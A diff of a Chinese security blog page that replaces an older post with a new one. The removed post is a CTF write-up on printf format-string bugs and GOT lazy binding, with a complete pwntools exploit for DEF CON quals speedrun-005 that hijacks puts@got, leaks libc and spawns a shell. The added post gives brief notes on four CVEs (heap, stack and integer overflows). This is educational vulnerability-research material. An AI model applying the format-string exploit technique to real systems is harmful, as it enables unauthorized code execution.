@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>pwner | 风云阁</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="pwner | 风云阁">
+  <title>CVEs | 风云阁</title>
+  <meta name="keywords" content=" CVE , Pwn ">
+  <meta name="description" content="CVEs | 风云阁">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="看看 CVE 漏洞长什么样？ 不定期更新吧。 CVE-2019-1010305https:&#x2F;&#x2F;github.com&#x2F;kyz&#x2F;libmspack&#x2F;issues&#x2F;27 这个洞应该是Fuzz出来的。 堆溢出。 CVE-2019-1010223从cvedetails可知存在漏洞的版本 。 下载源码 0.4.8 版本。 aubio_tempo_t * new_aubio_tempo (const char_">
 <meta property="og:type" content="article">
@@ -294,19 +294,27 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Pwner" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-CVEs" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">pwner</h1>
+        <h1 class="article-title">CVEs</h1>
     
     <div class="article-meta">
         
         
         
+        
+        <span class="tag">
+            
+            <a class="color4">CVE</a>
+            
+            <a class="color4">Pwn</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-16 02:06:12'>2019-07-22 00:00</time>
+        创建时间:<time class="date" title='更新时间: 2020-04-05 21:00:04'>2020-04-05 20:45</time>
         
     </div>
     <div class="article-meta">
@@ -328,7 +336,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#格式化字符串"><span class="toc-text">格式化字符串</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#defcon-quals-oooctf-—-speedrun-005"><span class="toc-text">defcon quals oooctf — speedrun-005</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-1010305"><span class="toc-text">CVE-2019-1010305</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-1010223"><span class="toc-text">CVE-2019-1010223</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2018-16367"><span class="toc-text">CVE-2018-16367</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2018-17088"><span class="toc-text">CVE-2018-17088</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -344,107 +352,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><pre><code>%[parameter][flags][field width][.precision][length]type
-
-</code></pre><p>Wiki-FMTstr</p>
-<p>[<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2]" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2]</a></p>
-<p>调试64位程序：</p>
-<p>linux ELF 程序用延迟绑定设计来加速动态链接库函数调用。lbc函数调用从function@plt开始，用gdb调试可清晰看到调用过程。function@got保存了寻找该函数的下一个跳转地址。</p>
-<pre><code># 用这个程序举例。
-int main()
-{
-    double a = 074;
-    printf(&quot;%1$o,%1$x,%2$o,%2$x&quot;,2333,6666);
-    return 0;
-}
-
-</code></pre><p>第一次调用printf，rip 跳到 prinf@plt </p>
-<pre><code>0x400530       &lt;printf@plt&gt;                      jmp    qword ptr [rip + 0x200af2] &lt;0x601028&gt;
-
-# 0x601028是printf@got。 存的值为0x400536</code></pre><p>继续查看跳转直到printf@got值为0x7fxxxxxxxxxxx的地址。</p>
-<p>跟踪路径得到 —&gt; dl_runtime_resolve_xsave —&gt; _dl_fixup</p>
-<pre><code>0x7f630d525b17 &lt;_dl_fixup+279&gt;                    mov    qword ptr [rbx], rax</code></pre><p>此处指令将 libc 的printf函数地址存放到printf@got中。绑定完成。</p>
-<p>下次调用printf，rip 跳转到 printf@plt —&gt; printf@got —&gt; printf@libc;</p>
-<h1 id="defcon-quals-oooctf-—-speedrun-005"><a href="#defcon-quals-oooctf-—-speedrun-005" class="headerlink" title="defcon quals oooctf — speedrun-005"></a>defcon quals oooctf — speedrun-005</h1><pre><code class="c">unsigned __int64 sub_40069D()
-{
-  char buf; // [rsp+0h] [rbp-410h]
-  unsigned __int64 v2; // [rsp+408h] [rbp-8h]
-
-  v2 = __readfsqword(0x28u);
-  printf(&quot;What do you mean this time? &quot;);
-  read(0, &amp;buf, 0x400uLL);
-  printf(&quot;Interesting &quot;, &amp;buf);
-  printf(&amp;buf);
-  puts(&quot; food for thought&quot;);
-  return __readfsqword(0x28u) ^ v2;
-}
-
-//printf(&amp;buf)
-//存在格式化字符串漏洞 </code></pre>
-<p>利用思路：</p>
-<ol>
-<li>hijack puts@got —&gt; func@0x40069D，获得多次read机会。</li>
-<li>leak read@got，得 one_gadgets 的内存地址。</li>
-<li>hijack puts@got —&gt; one_gadgets，弹shell，pwn掉。</li>
-</ol>
-<p>exp：</p>
-<pre><code class="python">#coding=utf8
-from pwn import *
-import plus_fmt as pft
-
-
-
-bn = process(&#39;./speedrun-005&#39;)
-
-debug = 1
-if debug:
-    context.log_level = &#39;debug&#39;
-    context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
-    gdb.attach(bn)
-
-elf = ELF(&#39;./speedrun-005&#39;)
-libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
-read_libc = libc.symbols[&#39;read&#39;]
-puts_got = elf.got[&#39;puts&#39;]
-read_got = elf.got[&#39;read&#39;]
-printf_plt = elf.symbols[&#39;printf&#39;]
-printf_got = elf.got[&#39;printf&#39;]
-main_addr= 0x040069D
-vun_addr = 0x00400765
-one_addr = 0xf1147
-print &#39;printf:&#39;,hex(printf_got)
-
-offset = 6
-bn.recvuntil(&#39;his time? &#39;)
-
-tag = {puts_got:vun_addr}
-leak_can  = &#39;leee%7$s&#39;+p64(read_got)
-payload = pft.new_fmtstr_payload(6, tag, numbwritten=0,bits=64, write_size=&#39;short&#39;)
-bn.send(payload)
-sleep(0.05)
-payload = leak_can
-bn.sendline(payload)
-bn.recvuntil(&#39;Interesting &#39;)
-bn.recvuntil(&#39;Interesting &#39;)
-bn.recvuntil(&#39;leee&#39;)
-
-real_read = u64(bn.recv(6)+&#39;\x00\x00&#39;)
-libc_base = real_read- read_libc
-one = one_addr+libc_base
-print(hex(one))
-
-sleep(0.05)
-tag = {puts_got:one}
-payload = pft.new_fmtstr_payload(6, tag, numbwritten=0,bits=64, write_size=&#39;short&#39;)
-bn.sendline(payload)
-bn.interactive()
-</code></pre>
-<blockquote>
-<p>调试 </p>
-<p>in gdb: vmmap</p>
-<p>pmap <proc_id></proc_id></p>
-<p>ps -aux | grep <proc_name></proc_name></p>
-</blockquote>
+        <p>看看 CVE 漏洞长什么样？ 不定期更新吧。</p>
+<h4 id="CVE-2019-1010305"><a href="#CVE-2019-1010305" class="headerlink" title="CVE-2019-1010305"></a><a href="https://www.cvedetails.com/cve/CVE-2019-1010305/" target="_blank" rel="noopener">CVE-2019-1010305</a></h4><p><a href="https://github.com/kyz/libmspack/issues/27" target="_blank" rel="noopener">https://github.com/kyz/libmspack/issues/27</a></p>
+<p>这个洞应该是Fuzz出来的。 堆溢出。</p>
+<h4 id="CVE-2019-1010223"><a href="#CVE-2019-1010223" class="headerlink" title="CVE-2019-1010223"></a><a href="https://www.cvedetails.com/cve/CVE-2019-1010223/" target="_blank" rel="noopener">CVE-2019-1010223</a></h4><p>从cvedetails可知存在漏洞的版本 。 下载源码 0.4.8 版本。</p>
+<pre><code>aubio_tempo_t * new_aubio_tempo (const char_t * tempo_mode,
+    uint_t buf_size, uint_t hop_s`ize, uint_t samplerate)</code></pre><p>函数存在漏洞。 tempo_mode 常量字符串长度可能超过20。</p>
+<p><img src="/2020/04/05/CVEs/image-20200405110907306.png" alt></p>
+<p><img src="/2020/04/05/CVEs/image-20200405110328221.png" alt></p>
+<p>可触发栈溢出。</p>
+<h4 id="CVE-2018-16367"><a href="#CVE-2018-16367" class="headerlink" title="CVE-2018-16367"></a><a href="https://www.cvedetails.com/cve/CVE-2018-16367/" target="_blank" rel="noopener">CVE-2018-16367</a></h4><p>沙箱权限用的黑名单。可以泄露测试数据。 可写目录。 plusls tql。</p>
+<h4 id="CVE-2018-17088"><a href="#CVE-2018-17088" class="headerlink" title="CVE-2018-17088"></a><a href="https://www.cvedetails.com/cve/CVE-2018-17088/" target="_blank" rel="noopener">CVE-2018-17088</a></h4><p>jhead gpsinfo.c </p>
+<p><img src="/2020/04/05/CVEs/image-20200405122005539.png" alt="image-20200405122005539"></p>
+<p>整数溢出。 OffsetVal+ByteCount (int)</p>
+<p><img src="/2020/04/05/CVEs/image-20200405124037117.png" alt="image-20200405124037117"></p>
+<p>ValuePtr访问非法地址，可触发crash。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
@@ -454,12 +376,12 @@ bn.interactive()
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>pwner</p>
+    <p><span class="copy-title">文章标题:</span>CVEs</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-07-22, 00:00:00</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-16, 02:06:12</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/07/22/Pwner/" title="pwner">https://primelyw.github.io/2019/07/22/Pwner/</a>
+    <p><span class="copy-title">发布时间:</span>2020-04-05, 20:45:40</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-05, 21:00:04</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/05/CVEs/" title="CVEs">https://primelyw.github.io/2020/04/05/CVEs/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
